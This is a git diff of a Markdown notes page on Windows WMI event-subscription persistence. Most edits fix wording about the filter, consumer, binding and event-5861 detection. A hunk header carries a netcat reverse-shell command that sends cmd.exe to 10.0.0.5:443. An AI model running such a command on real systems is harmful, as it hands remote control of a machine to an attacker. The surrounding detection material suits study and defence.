@@ -66,7 +66,7 @@ C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
 
 ## Observations
 
-Note the process ancesry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:
+Note the process ancestry of the shell - as usual, wmi/winrm spawns processes from `WmiPrvSE.exe`:
 
 ![](../../.gitbook/assets/wmi-shell-system.png)
 
@@ -80,21 +80,21 @@ Get-WmiObject -Class __EventFilter -Namespace root\subscription
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
-Note the Query which suggests this wmi filters is checking system uptime every 5 seconds and is checking if its value is more or equal to 1200s:
+Note the `Query` property which suggests this wmi filter is checking system's uptime every 5 seconds and is checking if the system has been up for at least 1200 seconds:
 
 ![](../../.gitbook/assets/wmi-filter.png)
+
+Event consumer, suggesting that the `shell.cmd` will be executed upon invokation as specified in the property `ExecutablePath`:
 
 {% code-tabs %}
 {% code-tabs-item title="\_\_EventConsumer@victim" %}
 ```csharp
-Get-WmiObject -Class __EventConsumer -Namespace root\subscription:
+Get-WmiObject -Class __EventConsumer -Namespace root\subscription
 ```
 {% endcode-tabs-item %}
 {% endcode-tabs %}
 
 ![](../../.gitbook/assets/wmi-consumer.png)
-
-
 
 {% code-tabs %}
 {% code-tabs-item title="\_\_FilterToConsumerBinding@victim" %}
@@ -106,7 +106,7 @@ Get-WmiObject -Class __FilterToConsumerBinding -Namespace root\subscription
 
 ![](../../.gitbook/assets/wmi-binding.png)
 
-Microsoft-Windows-WMI-Activity/Operational logs contains logs for event `5861` that capture the event filter and event consumer creations:
+Microsoft-Windows-WMI-Activity/Operational contains logs for event `5861` that capture  event filter and event consumer creations on the victim system:
 
 ![](../../.gitbook/assets/wmi-filter-consumer-creation.png)
 
@@ -127,10 +127,4 @@ Based on the research by [Matthew Graeber](https://twitter.com/mattifestation) a
 {% embed data="{\"url\":\"https://www.eideon.com/2018-03-02-THL03-WMIBackdoors/\",\"type\":\"link\",\"title\":\"Tales of a Threat Hunter 2\",\"description\":\"Following the trace of WMI Backdoors & other nastiness\"}" %}
 
 {% embed data="{\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/embedded/aa940177\(v=winembedded.5\)\",\"type\":\"link\",\"title\":\"WMI Consumers\",\"icon\":{\"type\":\"icon\",\"url\":\"https://docs.microsoft.com/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://docs.microsoft.com/\_themes/docs.theme/master/en-us/\_themes/images/microsoft-header.png\",\"width\":128,\"height\":128,\"aspectRatio\":1}}" %}
-
-
-
-
-
-
 
